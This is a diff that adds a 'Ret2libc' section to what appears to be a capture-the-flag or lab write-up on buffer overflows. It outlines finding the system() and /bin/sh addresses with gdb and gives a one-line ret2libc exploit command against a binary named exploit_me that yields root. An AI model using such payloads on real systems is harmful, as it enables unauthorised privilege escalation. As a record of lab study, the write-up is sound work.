@@ -224,3 +224,21 @@ A buffer overflow attack typically involves violating programming languages and 
 ```
 
 <img src="https://www.researchgate.net/publication/281560966/figure/fig1/AS:652973764009994@1532692485512/Stack-buffer-overflow-attack_Q640.jpg" width="300"/>
+
+## Ret2libc
+
+we used gdb to decompile the execute file
+
+<img src="./Ressources/main_gdb.png" width="500"/>
+
+we retrieved the system address `p system`
+
+<img src="./Ressources/psystem.png" width="500"/>
+
+now we need to find the _/bin/sh_ address:
+
+<img src="./Ressources/proc_map.png" width="500"/>
+
+Then we run the command : _./exploit_me $(python -c 'print "A"\*140 + "\x60\xb0\xe6\xb7" + "AAAA" + "\x58\xcc\xf8\xb7"')_
+
+<img src="./Ressources/root.png" />
